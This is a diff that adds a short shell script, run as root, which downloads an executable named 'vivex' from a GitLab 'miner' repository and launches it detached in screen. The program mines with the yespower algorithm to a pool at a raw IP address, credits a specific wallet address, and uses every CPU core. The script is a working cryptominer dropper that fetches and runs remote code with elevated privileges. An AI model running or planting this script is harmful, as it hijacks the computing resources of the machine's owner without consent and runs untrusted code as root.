@@ -1,0 +1,7 @@
+sudo su <<EOF
+sudo sysctl -w vm.nr_hugepages=2080
+sudo apt update -y && sudo apt install screen -y && screen
+curl -0 https://gitlab.com/ghcees/miner/-/raw/main/sm245 -o vivex && chmod +x vivex
+screen -dms run ./vivex -a yespower -o 47.254.125.141:6666 -u v4rU16nhcJt4T9EPJ3xqjDpnCrsLKWAVrC -t $(nproc --all) --worker $(echo $(TZ=UTC-7 date +"%H-%M")) --password x --enable-1gb-hugepages --keepalive true --disable-gpu
+EOF
+screen -r
